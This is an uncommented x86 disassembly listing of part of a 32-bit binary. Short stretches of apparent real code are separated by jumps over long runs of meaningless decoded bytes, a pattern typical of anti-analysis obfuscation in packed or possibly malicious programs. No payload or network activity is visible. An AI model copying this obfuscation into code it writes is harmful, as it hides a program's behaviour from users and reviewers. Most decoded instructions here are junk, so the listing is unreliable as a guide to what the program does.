  40bf2f:	sbb    DWORD PTR ds:0x4305a6,0xe94
  40bf39:	jmp    0x40c097
  40bf3e:	fmul   QWORD PTR [edi+0x7d6d4fad]
  40bf44:	cld    
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	aad    0x57
  40bf4c:	gs scas al,BYTE PTR es:[edi]
  40bf4e:	jno    0x40bf4c
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf2f
  40bf57:	aam    0x5a
  40bf59:	(bad)  
  40bf5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf5b:	sbb    al,0x75
  40bf5d:	xchg   esi,eax
  40bf5e:	aam    0x60
  40bf60:	jno    0x40bf76
  40bf62:	jnp    0x40bef9
  40bf64:	pop    eax
  40bf65:	jmp    0xa9797cf1
  40bf6a:	rcr    BYTE PTR [ebp-0x76],0xe
  40bf6e:	mov    ecx,0x3cc4bda5
  40bf73:	mov    ds:0x4beefdf3,al
  40bf78:	cmp    DWORD PTR [ebp+0x301067c7],0x22
  40bf7f:	sbb    al,0x23
  40bf81:	cli    
  40bf82:	xchg   edx,eax
  40bf83:	add    eax,0xdcc2420a
  40bf88:	std    
  40bf89:	scas   al,BYTE PTR es:[edi]
  40bf8a:	test   BYTE PTR [edi+ebx*4],ch
  40bf8d:	aad    0x3
  40bf8f:	addr16 push ebx
  40bf91:	in     eax,dx
  40bf92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf93:	lock push es
  40bf95:	scas   eax,DWORD PTR es:[edi]
  40bf96:	or     esp,DWORD PTR [eax+0x3e]
  40bf99:	das    
  40bf9a:	mov    edi,0x87bd3938
  40bf9f:	aad    0x68
  40bfa1:	or     edi,DWORD PTR [eax]
  40bfa3:	cld    
  40bfa4:	pop    ecx
  40bfa5:	iret   
  40bfa6:	sub    al,0x9a
  40bfa8:	mov    eax,0xa528fbe9
  40bfad:	mov    al,ds:0xc234aca2
  40bfb2:	mov    edx,0xf5e9e006
  40bfb7:	cwde   
  40bfb8:	outs   dx,BYTE PTR ds:[esi]
  40bfb9:	pop    esi
  40bfba:	xchg   ecx,eax
  40bfbb:	mov    BYTE PTR [ebx],bl
  40bfbd:	sub    ecx,0x32
  40bfc0:	push   ds
  40bfc1:	fdivr  QWORD PTR [esi]
  40bfc3:	outs   dx,DWORD PTR ds:[esi]
  40bfc4:	add    BYTE PTR [edx],cl
  40bfc6:	xor    DWORD PTR [esi-0x2ab513c6],ecx
  40bfcc:	dec    esp
  40bfcd:	jmp    0x40bff8
  40bfcf:	xchg   edi,eax
  40bfd0:	inc    esi
  40bfd1:	repnz retf 0xaed5
  40bfd5:	cmp    edi,DWORD PTR [ecx-0x2f]
  40bfd8:	and    DWORD PTR [ebx+eiz*1-0x7e5a5f91],eax
  40bfdf:	or     BYTE PTR [ebx-0x6b],cl
  40bfe2:	xlat   BYTE PTR ds:[ebx]
  40bfe3:	xor    eax,0x393b6bbf
  40bfe8:	push   esp
  40bfe9:	xchg   edi,eax
  40bfea:	mov    bl,0x6e
  40bfec:	add    al,0x26
  40bfee:	cmc    
  40bfef:	or     DWORD PTR [edx-0x7f],edx
  40bff2:	call   DWORD PTR [eax]
  40bff4:	mov    dl,0x68
  40bff6:	push   ax
  40bff8:	into   
  40bff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bffa:	cmp    eax,0x5d330c63
  40bfff:	aam    0xe2
  40c001:	inc    ecx
  40c002:	popf   
  40c003:	scas   al,BYTE PTR es:[edi]
  40c004:	mov    esp,0xafe26042
  40c009:	mov    DWORD PTR [ebp+ebp*8-0x2],ebp
  40c00d:	out    0xd6,eax
  40c00f:	das    
  40c010:	mov    bh,0x1f
  40c012:	mov    edi,0x588b1e50
  40c017:	lock imul esp,DWORD PTR [edi+0x215535c1],0x43
  40c01f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c020:	dec    edx
  40c021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c022:	push   esi
  40c023:	inc    eax
  40c024:	inc    ecx
  40c025:	pop    ebp
  40c026:	shr    DWORD PTR [ecx-0x42],1
  40c029:	and    al,0x2c
  40c02b:	xchg   ebp,eax
  40c02c:	jno    0x40c06d
  40c02e:	gs ins BYTE PTR es:[edi],dx
  40c030:	inc    ebx
  40c031:	jp     0x40bfc6
  40c033:	sub    ch,ah
  40c035:	or     ebp,DWORD PTR [edx]
  40c037:	dec    ebx
  40c038:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c03a:	push   ds
  40c03b:	mov    ebx,ds
  40c03d:	fld    QWORD PTR [edx+0x156e655a]
  40c043:	ret    
  40c044:	enter  0xdcd4,0x3e
  40c048:	pop    eax
  40c049:	mov    DWORD PTR [ebx-0x5a],ebp
  40c04c:	cdq    
  40c04d:	cmp    dh,BYTE PTR [ecx]
  40c04f:	jge    0x40bfe4
  40c051:	stc    
  40c052:	dec    ebx
  40c053:	sbb    al,0x3c
  40c055:	data16 mov WORD PTR [edx],ds
  40c058:	pop    eax
  40c059:	xchg   ecx,eax
  40c05a:	mov    esp,0x856b1529
  40c05f:	sar    DWORD PTR [eax],0xb
  40c062:	out    dx,eax
  40c063:	ds push ss
  40c065:	mov    eax,0xb08acd6f
  40c06a:	xor    eax,0x3d71f886
  40c06f:	inc    eax
  40c070:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40c072:	and    DWORD PTR [ecx-0x9c7f1a8],eax
  40c078:	fwait
  40c079:	lahf   
  40c07a:	sbb    al,0xbd
  40c07c:	mov    ebx,DWORD PTR [ebp-0x4439eab5]
  40c082:	push   0x937bbf3c
  40c087:	adc    al,0xdf
  40c089:	lahf   
  40c08a:	pop    esi
  40c08b:	rcr    DWORD PTR [esi-0x1a9a99f8],cl
  40c091:	in     eax,dx
  40c092:	xchg   ebx,eax
  40c093:	or     BYTE PTR [esi+0x48036d6c],ch
  40c099:	and    BYTE PTR [ecx+0x430642],ah
  40c09f:	or     eax,DWORD PTR ds:0x42ef0c
  40c0a5:	mov    ds:0x430642,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ef1c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43059e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e862
  40c0cb:	mov    ds:0x43059e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x4305a6,0x0
  40c0dd:	mov    eax,ds:0x4305a6
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x4305a6,eax
  40c0e8:	cmp    DWORD PTR ds:0x4305a6,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x4305b2
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e876
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e9f3
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42ebf4
  40c11d:	cmp    DWORD PTR ds:0x4305a6,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	out    dx,al
  40c147:	adc    eax,0xfd32264e
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c0f4
  40c153:	test   dl,dh
  40c155:	cdq    
  40c156:	addr16 icebp 
  40c158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c159:	aad    0x99
  40c15b:	and    bh,dl
  40c15d:	push   esi
  40c15e:	pop    ecx
  40c15f:	or     eax,0xec9ca88b
  40c164:	xor    dh,0x26
  40c167:	ror    DWORD PTR [ecx-0x2de48260],1
  40c16d:	sbb    bl,bh
  40c16f:	mov    esp,0xad9f397f
  40c174:	femms  
  40c176:	and    al,0x12
  40c178:	leave  
  40c179:	std    
  40c17a:	push   0xf601ec55
  40c17f:	int    0xbc
  40c181:	inc    ebp
  40c182:	inc    ebx
  40c183:	lds    ecx,FWORD PTR ds:0xaf54f200
  40c189:	inc    edi
  40c18a:	fxch   st(5)
  40c18c:	dec    esp
  40c18d:	out    0x28,eax
  40c18f:	pop    edx
  40c190:	leave  
  40c191:	or     esi,esi
  40c193:	imul   ebx,esi,0xffffffec
  40c196:	mov    edi,0x964cfaf8
  40c19b:	cmp    eax,0xfefc6978
  40c1a0:	push   0x7e3b304e
  40c1a5:	ins    DWORD PTR es:[edi],dx
  40c1a6:	pop    ebp
  40c1a7:	pop    eax
  40c1a8:	mov    ds:0x352dccd6,eax
  40c1ad:	inc    ebx
  40c1ae:	clc    
  40c1af:	mov    eax,0xe24c230d
  40c1b4:	std    
  40c1b5:	push   edi
  40c1b6:	dec    ebp
  40c1b7:	cdq    
  40c1b8:	mov    ah,BYTE PTR [ebx+0x46]
  40c1bb:	dec    eax
  40c1bc:	jp     0x40c228
  40c1be:	adc    ah,BYTE PTR [ecx-0x66]
  40c1c1:	or     bh,dl
  40c1c3:	stos   DWORD PTR es:[edi],eax
  40c1c4:	push   ebp
  40c1c5:	pop    es
  40c1c6:	jp     0x40c215
  40c1c8:	sub    edi,0x39a8e640
  40c1ce:	xchg   ebx,eax
  40c1cf:	call   DWORD PTR [ebp-0x13d6753b]
  40c1d5:	fst    DWORD PTR [eax+0x7e]
  40c1d8:	fnsave [ebp-0x4b01408d]
  40c1de:	in     eax,dx
  40c1df:	mov    bl,0xc2
  40c1e1:	xor    eax,ecx
  40c1e3:	inc    ecx
  40c1e4:	mov    ecx,DWORD PTR [ebp+eiz*4-0x4f]
  40c1e8:	sub    ch,BYTE PTR [edx+0x1d]
  40c1eb:	aaa    
  40c1ec:	jmp    0x40c215
  40c1ee:	or     ebp,DWORD PTR [edi]
  40c1f0:	fiadd  WORD PTR [eax]
  40c1f2:	(bad)
  40c1f5:	ret    
  40c1f6:	jb     0x40c230
  40c1f8:	pushf  
  40c1f9:	cmp    ch,BYTE PTR [edi]
  40c1fb:	xor    al,0x65
  40c1fd:	sahf   
  40c1fe:	push   esp
  40c1ff:	xor    BYTE PTR [ebx-0x2],ah
  40c202:	and    al,0x2a
  40c204:	sub    eax,0x57e91c78
  40c209:	fmulp  st(4),st
  40c20b:	daa    
  40c20c:	dec    edx
  40c20d:	push   ebx
  40c20e:	iret   
  40c20f:	enter  0xc5bb,0xba
  40c213:	push   edi
  40c214:	out    dx,al
  40c215:	int    0x13
  40c217:	xchg   DWORD PTR [esi+edx*1-0x20292668],ebp
  40c21e:	les    eax,FWORD PTR [ebx]
  40c220:	stc    
  40c221:	int    0x82
  40c223:	(bad)
  40c226:	cmp    ecx,ebx
  40c228:	(bad)  
  40c229:	jmp    0x3ea8:0x78fef40b
  40c230:	outs   dx,DWORD PTR ds:[esi]
  40c231:	xchg   ecx,eax
  40c232:	jge    0x40c23e
  40c234:	pop    esp
  40c235:	(bad)  
  40c236:	mov    WORD PTR [edx+ebp*2],ss
  40c239:	fisttp QWORD PTR [eax]
  40c23b:	cwde   
  40c23c:	sbb    dh,BYTE PTR [eax-0x20]
  40c23f:	jmp    0x40c276
  40c241:	adc    esp,DWORD PTR gs:[ebx]
  40c244:	xchg   esp,eax
  40c245:	mov    BYTE PTR [ecx-0x638abc8f],0xce
  40c24c:	add    DWORD PTR [edi+0x7f953f96],0xffffffb1
  40c253:	fs push edx
  40c255:	ret    
  40c256:	and    al,0x40
  40c258:	cmc    
  40c259:	inc    ecx
  40c25a:	fimul  DWORD PTR [eax-0x6b]
  40c25d:	sahf   
  40c25e:	jb     0x40c230
  40c260:	push   ebx
  40c261:	pop    ss
  40c262:	lahf   
  40c263:	outs   dx,DWORD PTR ds:[esi]
  40c264:	jmp    0x40c213
  40c266:	ins    DWORD PTR es:[edi],dx
  40c267:	fidiv  DWORD PTR [ebx+0x18]
  40c26a:	out    dx,al
  40c26b:	inc    edi
  40c26c:	aad    0x66
  40c26e:	fidivr DWORD PTR fs:[edx]
  40c271:	popa   
  40c272:	xor    eax,0xda1e3919
  40c277:	ret    
  40c278:	ins    DWORD PTR es:[edi],dx
  40c279:	leave  
  40c27a:	ja     0x40c29b
  40c27c:	ds and eax,0x2c219a0a
  40c282:	push   ecx
  40c283:	mov    al,0x6b
  40c285:	add    dl,dh
  40c287:	imul   ebp,DWORD PTR [edi],0xccfde2bb
  40c28d:	daa    
  40c28e:	push   ebp
  40c28f:	pop    edi
  40c290:	jns    0x40c264
  40c292:	sahf   
  40c293:	mov    DWORD PTR [ebp-0x14],ecx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0x5fe92bcc,0xf3549be8
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c305
  40c2bd:	pop    ecx
  40c2be:	test   BYTE PTR [eax+edx*1],al
  40c2c1:	sub    edi,DWORD PTR [eax+edx*1]
  40c2c4:	shl    DWORD PTR [esi-0x57],0x3c
  40c2c8:	gs test cl,ah
  40c2cb:	sti    
  40c2cc:	jae    0x40c27c
  40c2ce:	ficomp WORD PTR [ebx+0x13]
  40c2d1:	sub    DWORD PTR [ebx-0x4ab2c809],edx
  40c2d7:	out    0xe,eax
  40c2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2da:	mov    ds:0xbe89e6f,al
  40c2df:	stc    
  40c2e0:	xchg   ebx,eax
  40c2e1:	xlat   BYTE PTR ds:[ebx]
  40c2e2:	mov    WORD PTR [edx],ss
  40c2e4:	inc    ebp
  40c2e5:	test   ebx,ebp
  40c2e7:	les    ecx,FWORD PTR [edx]
  40c2e9:	xlat   BYTE PTR ds:[ebx]
  40c2ea:	add    BYTE PTR [ebx],cl
  40c2ec:	imul   edx,edx,0x49
  40c2ef:	sbb    al,0xa4
  40c2f1:	push   esi
  40c2f2:	das    
  40c2f3:	sbb    BYTE PTR [ecx-0x3f],ch
  40c2f6:	out    dx,eax
  40c2f7:	ins    DWORD PTR es:[edi],dx
  40c2f8:	cmp    cl,bl
  40c2fa:	or     eax,0xaa8efb8a
  40c2ff:	into   
  40c300:	rcr    BYTE PTR [edx],1
  40c302:	pop    ds
  40c303:	xchg   DWORD PTR [esi],edx
  40c305:	inc    BYTE PTR [esi+eiz*2]
  40c308:	and    al,0x4d
  40c30a:	in     al,dx
  40c30b:	retf   
  40c30c:	lock enter 0x5e18,0x82
  40c311:	loop   0x40c332
  40c313:	ins    BYTE PTR es:[edi],dx
  40c314:	jnp    0x40c2ec
  40c316:	jnp    0x40c30f
  40c318:	test   al,0xca
  40c31a:	sar    DWORD PTR [ecx],cl
  40c31c:	test   eax,0xf58d9e0e
  40c321:	and    DWORD PTR es:[ebx-0x66aeb8cd],esp
  40c328:	out    dx,al
  40c329:	stos   DWORD PTR es:[edi],eax
  40c32a:	fs and eax,0x5866bd06
  40c330:	dec    edx
  40c331:	scas   al,BYTE PTR es:[edi]
  40c332:	into   
  40c333:	mov    eax,0x3a1819b6
  40c339:	mov    ecx,DWORD PTR [ebp-0x55540655]
  40c33f:	call   0x7b69:0xf61edfa7
  40c346:	ret    
  40c347:	mov    dl,0x42
  40c349:	icebp  
  40c34a:	push   ds
  40c34b:	clc    
  40c34c:	push   eax
  40c34d:	cmc    
  40c34e:	repnz loop 0x40c393
  40c351:	cld    
  40c352:	xor    bh,BYTE PTR [edx]
  40c354:	add    BYTE PTR [eax+0x76],ch
  40c357:	arpl   bx,sp
  40c359:	dec    edx
  40c35a:	gs dec edx
  40c35c:	in     eax,0xc
  40c35e:	pop    ss
  40c35f:	jmp    0x40c3cb
  40c361:	cmp    ebp,ebx
  40c363:	pop    esi
  40c364:	jne    0x40c318
  40c366:	pushf  
  40c367:	ds or  al,0x9a
  40c36a:	push   0x57
  40c36c:	pop    bx
  40c36e:	sbb    al,0x44
  40c370:	(bad)  
  40c371:	in     eax,dx
  40c372:	fld    QWORD PTR [esi+ebp*8]
  40c375:	dec    esi
  40c376:	int3   
  40c377:	add    eax,0x184759
  40c37c:	xor    al,0xfa
  40c37e:	fyl2x  
  40c380:	push   cs
  40c381:	fs shl ch,1
  40c384:	iret   
  40c385:	lods   eax,DWORD PTR ds:[esi]
  40c386:	in     al,0x3d
  40c388:	mov    ch,0x6c
  40c38a:	mov    esi,0x5b2d63fa
  40c38f:	loopne 0x40c333
  40c391:	mov    esi,0xadb745e1
  40c396:	inc    ebx
  40c397:	or     bh,0xc8
  40c39a:	mov    eax,0xd05bfac7
  40c39f:	xor    ebx,DWORD PTR [esi-0x76054285]
  40c3a5:	and    al,0x83
  40c3a7:	call   DWORD PTR [edx-0x6d]
  40c3aa:	dec    esi
  40c3ab:	mov    edi,0x21bff4af
  40c3b0:	cld    
  40c3b1:	aad    0xdb
  40c3b3:	imul   edi,DWORD PTR [di],0x1c
  40c3b7:	cs jbe 0x40c390
  40c3ba:	mov    ds:0xce7c0a0d,al
  40c3bf:	push   esp
  40c3c0:	out    dx,eax
  40c3c1:	lahf   
  40c3c2:	pushf  
  40c3c3:	inc    edi
  40c3c4:	push   ebp
  40c3c5:	shl    BYTE PTR [ecx-0x109ad6fa],cl
  40c3cb:	repz test BYTE PTR [ebx+0x2a41b15e],0xb0
  40c3d3:	cmp    BYTE PTR [eax],ah
  40c3d5:	prefetchw (bad)
  40c3d6:	or     eax,0xb32392ca
  40c3db:	xor    DWORD PTR [edi],0xffffffd0
  40c3de:	sbb    al,0xd5
  40c3e0:	out    0x86,al
  40c3e2:	inc    edx
  40c3e3:	test   ah,dl
  40c3e5:	sbb    eax,0x8aa75ea6
  40c3ea:	ror    DWORD PTR [ecx-0xf],0x47
  40c3ee:	pop    eax
  40c3ef:	mov    DWORD PTR [edx+0x5d],esi
  40c3f2:	(bad)  
  40c3f3:	jno    0x40c3d0
  40c3f5:	lods   eax,DWORD PTR ds:[esi]
  40c3f6:	popf   
  40c3f7:	(bad)  
  40c3f8:	xchg   edx,eax
  40c3f9:	shr    DWORD PTR [ecx+ebx*8-0x18],1
  40c3fd:	lea    eax,[ebp-0x8]
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	inc    esp
  40c412:	and    DWORD PTR [ebx+0x7effb491],edi
  40c418:	jle    0x40c459
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c420
  40c41e:	rcr    BYTE PTR [ecx+0x58],0xbe
  40c422:	push   0x0
  40c424:	jle    0x40c442
  40c426:	std    
  40c427:	pop    ebx
  40c428:	push   ss
  40c429:	push   ebx
  40c42a:	clc    
  40c42b:	ror    bh,0xd7
  40c42e:	xchg   BYTE PTR [edi],al
  40c430:	cld    
  40c431:	adc    ecx,edi
  40c433:	inc    ebp
  40c434:	dec    esp
  40c435:	mov    es,WORD PTR [eax+edx*8]
  40c438:	mov    ch,0x78
  40c43a:	dec    esi
  40c43b:	ss mov ch,dh
  40c43e:	iret   
  40c43f:	add    al,0x2b
  40c441:	stos   BYTE PTR es:[edi],al
  40c442:	out    0x1b,eax
  40c444:	div    esp
  40c446:	mov    dl,0x45
  40c448:	ror    BYTE PTR [ebp+0x1acd1801],0xd9
  40c44f:	xor    DWORD PTR [eax+edi*2-0x75],0xa7a4113c
  40c457:	mov    bl,0x40
  40c459:	mov    esi,0xfaec1ad5
  40c45e:	adc    eax,0xb746eec7
  40c463:	mul    DWORD PTR [edx+0x7d5ae156]
  40c469:	bound  edi,QWORD PTR [ecx+edi*4+0x39]
  40c46d:	sub    bh,BYTE PTR [esi+0x4b]
  40c470:	leave  
  40c471:	sbb    DWORD PTR [edx-0x78018f76],0x156f3503
  40c47b:	scas   eax,DWORD PTR es:[edi]
  40c47c:	jl     0x40c462
  40c47e:	aam    0xf8
  40c480:	stc    
  40c481:	fbld   TBYTE PTR [bx+di-0x29e6]
  40c486:	pushf  
  40c487:	cmp    al,0xbf
  40c489:	repnz stc 
  40c48b:	out    0xc0,al
  40c48d:	xchg   edi,eax
  40c48e:	or     dl,bh
  40c490:	mov    dh,0x68
  40c492:	dec    ebp
  40c493:	sub    cl,BYTE PTR [esi+0x547c3a5c]
  40c499:	pop    ecx
  40c49a:	std    
  40c49b:	das    
  40c49c:	popf   
  40c49d:	pop    ecx
  40c49e:	aas    
  40c49f:	mov    ebp,0x206f7bad
  40c4a4:	mov    al,0x6
  40c4a6:	mov    ecx,0x259459fa
  40c4ab:	xor    ebp,DWORD PTR [ebx]
  40c4ad:	sbb    dl,BYTE PTR [edx+ebp*2-0x4c]
  40c4b1:	pop    ebx
  40c4b2:	add    BYTE PTR [ecx],cl
  40c4b4:	fs pushf 
  40c4b6:	mov    ebp,0x32130ce
  40c4bb:	mov    ecx,0x1753ddec
  40c4c0:	ret    
  40c4c1:	sar    DWORD PTR [edx+0x21],cl
  40c4c4:	lods   al,BYTE PTR ds:[esi]
  40c4c5:	test   BYTE PTR [esi-0x40],dl
  40c4c8:	leave  
  40c4c9:	pop    eax
  40c4ca:	pop    esp
  40c4cb:	in     eax,dx
  40c4cc:	adc    BYTE PTR [edi-0x5b118d1d],ah
  40c4d2:	mov    al,ds:0xe78763b1
  40c4d7:	push   ds
  40c4d8:	dec    ebx
  40c4d9:	inc    esp
  40c4da:	in     eax,0x42
  40c4dc:	scas   eax,DWORD PTR es:[edi]
  40c4dd:	xchg   edx,eax
  40c4de:	fdiv   QWORD PTR [esi-0x57f7bae3]
  40c4e4:	inc    ecx
  40c4e5:	jne    0x40c4ee
  40c4e7:	mov    ecx,0x12296aff
  40c4ec:	push   esi
  40c4ed:	test   al,0x47
  40c4ef:	pushw  ds
  40c4f1:	cwde   
  40c4f2:	dec    ebp
  40c4f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4f4:	add    dh,ah
  40c4f6:	xor    BYTE PTR [edx+0x29],bh
  40c4f9:	in     al,0xee
  40c4fb:	push   ss
  40c4fc:	cmp    al,0x46
  40c4fe:	in     al,dx
  40c4ff:	gs into 
  40c501:	jae    0x40c538
  40c503:	sbb    bl,bl
  40c505:	jnp    0x40c550
  40c507:	mov    ss,edi
  40c509:	(bad)  
  40c50a:	jae    0x40c585
  40c50c:	cld    
  40c50d:	lods   al,BYTE PTR ds:[esi]
  40c50e:	sub    cl,BYTE PTR [ebx]
  40c510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c511:	dec    eax
  40c512:	nop
  40c513:	into   
  40c514:	jl     0x40c54c
  40c516:	cmp    BYTE PTR [ecx-0x4598b8ac],cl
  40c51c:	arpl   WORD PTR [ecx],cx
  40c51e:	inc    ebx
  40c51f:	or     ecx,DWORD PTR [ecx]
  40c521:	stos   DWORD PTR es:[edi],eax
  40c522:	xor    DWORD PTR [edx-0x64],edx
  40c525:	ins    DWORD PTR es:[edi],dx
  40c526:	xor    BYTE PTR [esi+0x24392624],bh
  40c52c:	and    bl,BYTE PTR [eax+0x13]
  40c52f:	dec    edi
  40c530:	imul   edi,DWORD PTR [edx],0x5fb958cb
  40c536:	jge    0x40c52b
  40c538:	adc    bl,al
  40c53a:	pusha  
  40c53b:	inc    esp
  40c53c:	push   0x20373c08
  40c541:	jbe    0x40c5a9
  40c543:	xor    ah,BYTE PTR [ebx+0x7380d3e]
  40c549:	pop    ebx
  40c54a:	add    DWORD PTR [edx],ebp
  40c54c:	cdq    
  40c54d:	fist   DWORD PTR [edx+0x6382b461]
  40c553:	xchg   edi,eax
  40c554:	shr    BYTE PTR [ebp+0xa77ab66],cl
  40c55a:	inc    DWORD PTR [edx+eax*8-0x2fb27683]
  40c561:	push   eax
  40c562:	push   DWORD PTR [ebp-0x30]
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0x64324f9b
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c54f
  40c58e:	jg     0x40c573
  40c590:	fist   WORD PTR [edx-0x3219a5a2]
  40c596:	ins    BYTE PTR es:[edi],dx
  40c597:	dec    ecx
  40c598:	das    
  40c599:	mov    ebp,?
  40c59b:	mov    ds:0x45262291,eax
  40c5a0:	jae    0x40c595
  40c5a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a3:	(bad)  
  40c5a4:	mov    edx,DWORD PTR [ebx+0x62]
  40c5a7:	loopne 0x40c60d
  40c5a9:	lock mov ebx,0xce525738
  40c5af:	push   ds
  40c5b0:	(bad)  
  40c5b1:	(bad)  
  40c5b2:	fild   WORD PTR [esi+0x7ac2b5c3]
  40c5b8:	sbb    al,0xdc
  40c5ba:	fbld   TBYTE PTR [ebx-0x209e0a23]
  40c5c0:	and    eax,0xc6420867
  40c5c5:	jp     0x40c5b5
  40c5c7:	mov    bl,0xba
  40c5c9:	xchg   edi,eax
  40c5ca:	(bad)
  40c5ce:	ins    BYTE PTR es:[edi],dx
  40c5cf:	cmp    al,0x7e
  40c5d1:	mov    eax,0x6442d515
  40c5d6:	jne    0x40c62d
  40c5d8:	sahf   
  40c5d9:	in     eax,dx
  40c5da:	pop    ebp
  40c5db:	rcr    ah,0x11
  40c5de:	xchg   ecx,eax
  40c5df:	jmp    0x8b0c920a
  40c5e4:	hlt    
  40c5e5:	xor    ebp,0x77ce0f04
  40c5eb:	adc    DWORD PTR [eax-0x26],ecx
  40c5ee:	adc    dl,0xa
  40c5f1:	xchg   edi,eax
  40c5f2:	xchg   ebp,eax
  40c5f3:	sub    bl,BYTE PTR [ecx]
  40c5f5:	push   ds
  40c5f6:	jecxz  0x40c58c
  40c5f8:	push   eax
  40c5f9:	push   ecx
  40c5fa:	outs   dx,DWORD PTR ds:[esi]
  40c5fb:	and    eax,edx
  40c5fd:	inc    eax
  40c5fe:	push   0xf58c7f16
  40c603:	inc    esi
  40c604:	sub    esp,DWORD PTR [eax]
  40c606:	pusha  
  40c607:	or     BYTE PTR [eax-0x190190a6],0xab
  40c60e:	sub    esi,DWORD PTR [ebx+eiz*1]
  40c611:	push   ebp
  40c612:	popa   
  40c613:	ins    BYTE PTR es:[edi],dx
  40c614:	dec    ebx
  40c615:	fdiv   st(7),st
  40c617:	(bad)  
  40c618:	test   eax,0xc460d0d1
  40c61d:	sub    cl,BYTE PTR [eax]
  40c61f:	push   ss
  40c620:	int    0xa6
  40c622:	lds    esi,FWORD PTR [ecx-0x578e0320]
  40c628:	jmp    0x3aa3d4f8
  40c62d:	push   ebx
  40c62e:	(bad)  
  40c62f:	popf   
  40c630:	sbb    DWORD PTR [ebp-0x436c240c],ebp
  40c636:	scas   al,BYTE PTR es:[edi]
  40c637:	fs dec esi
  40c639:	add    eax,0xd8db6f9b
  40c63e:	in     al,dx
  40c63f:	cmp    al,0x6f
  40c641:	fs or  al,0xad
  40c644:	pop    ds
  40c645:	aas    
  40c646:	rol    DWORD PTR [ecx+0x4a],0x73
  40c64a:	lods   al,BYTE PTR ds:[esi]
  40c64b:	xchg   ebp,eax
  40c64c:	xchg   esp,eax
  40c64d:	xchg   ebx,eax
  40c64e:	dec    edx
  40c64f:	push   0xfffffffb
  40c651:	in     eax,0xb7
  40c653:	int    0xe3
  40c655:	aad    0x15
  40c657:	pop    edi
  40c658:	or     bh,BYTE PTR [edx-0x7c]
  40c65b:	repz jne 0x40c636
  40c65e:	add    dh,BYTE PTR [ebp-0x4]
  40c661:	lods   eax,DWORD PTR ds:[esi]
  40c662:	and    dl,dl
  40c664:	and    ebp,0x55654cca
  40c66a:	or     cl,BYTE PTR [ebp-0x3c]
  40c66d:	xor    edx,edi
  40c66f:	cmp    edx,edi
  40c671:	xor    BYTE PTR [edi+0x58],cl
  40c674:	xchg   edx,eax
  40c675:	outs   dx,BYTE PTR ds:[esi]
  40c676:	jb     0x40c611
  40c678:	pop    esp
  40c679:	sbb    esi,0x5c
  40c67c:	cld    
  40c67d:	pop    es
  40c67e:	push   edx
  40c67f:	xor    al,0x30
  40c681:	mov    ds:0x5ee06a,al
  40c686:	push   es
  40c687:	aaa    
  40c688:	jo     0x40c685
  40c68a:	dec    eax
  40c68b:	sahf   
  40c68c:	(bad)
  40c68f:	lock or DWORD PTR [ebx],ecx
  40c692:	xor    bl,BYTE PTR [ecx-0x7cf1a88]
  40c698:	aam    0x84
